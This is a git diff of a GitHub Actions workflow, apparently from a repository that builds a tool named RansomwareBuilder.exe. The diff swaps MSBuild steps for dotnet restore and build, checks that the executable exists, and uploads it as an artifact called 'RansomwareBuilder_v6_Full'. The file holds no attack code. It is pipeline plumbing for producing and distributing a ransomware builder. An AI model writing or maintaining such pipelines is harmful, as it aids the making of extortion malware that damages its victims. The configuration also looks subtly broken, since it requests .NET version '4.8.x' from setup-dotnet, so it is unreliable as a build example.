@@ -67,20 +67,19 @@ jobs:
         }
     
     # ========== СБОРКА БИЛДЕРА (C#) ==========
-    - name: Setup MSBuild
-      uses: microsoft/setup-msbuild@v2
-    
-    - name: Restore NuGet packages
-      run: |
-        dotnet restore builder.csproj
+    - name: Setup .NET
+      uses: actions/setup-dotnet@v4
+      with:
+        dotnet-version: '4.8.x'
     
     - name: Build Builder
       run: |
-        msbuild builder.csproj /p:Configuration=Release /p:Platform="Any CPU"
+        dotnet restore builder.csproj
+        dotnet build builder.csproj --configuration Release --runtime win-x86
         
-        if (Test-Path "bin\Release\RansomwareBuilder.exe") {
+        if (Test-Path "bin\Release\net48\win-x86\RansomwareBuilder.exe") {
             Write-Host "=== Build SUCCESS ==="
-            Get-ChildItem "bin\Release\RansomwareBuilder.exe" | Format-Table -AutoSize
+            Get-ChildItem "bin\Release\net48\win-x86\RansomwareBuilder.exe" | Format-Table -AutoSize
         } else {
             Write-Host "=== Build FAILED ==="
             exit 1
@@ -90,4 +89,4 @@ jobs:
       uses: actions/upload-artifact@v4
       with:
         name: RansomwareBuilder_v6_Full
-        path: bin\Release\RansomwareBuilder.exe
+        path: bin\Release\net48\win-x86\RansomwareBuilder.exe
